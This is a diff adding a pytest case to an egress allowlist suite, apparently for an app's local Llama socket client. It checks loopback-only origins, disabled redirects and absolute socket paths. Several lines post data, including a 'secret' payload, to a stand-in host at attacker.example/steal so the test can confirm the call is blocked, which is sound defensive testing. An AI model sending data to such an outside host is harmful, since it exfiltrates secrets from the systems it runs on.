@@ -352,6 +352,17 @@ class TestAllowlist:
         with pytest.raises(EgressBlocked, match="leaves the approved origin"):
             client.post("http://attacker.example/steal", json={})
 
+    def test_http_client_over_a_socket_is_loopback_only(self) -> None:
+        """A client on a Unix-domain socket (the app's LlamaXPCService) still names a loopback origin."""
+        client = egress.http_client(purpose="test", base_url="http://127.0.0.1:8790", uds="/tmp/garage/llama")
+        assert client.follow_redirects is False
+        with pytest.raises(EgressBlocked, match="leaves the approved origin"):
+            client.post("http://attacker.example/steal", content=b"secret")
+        with pytest.raises(EgressBlocked, match="loopback"):
+            egress.http_client(purpose="test", base_url=OFF_BOX_OLLAMA, uds="/tmp/garage/llama")
+        with pytest.raises(EgressBlocked, match="absolute"):
+            egress.http_client(purpose="test", base_url="http://127.0.0.1:8790", uds="garage/llama")
+
     def test_url_opener_is_pinned_to_its_origin(self) -> None:
         opener = egress.url_opener(purpose="test", base_url="http://127.0.0.1:8790")
         with pytest.raises(EgressBlocked, match="leaves the approved origin"):
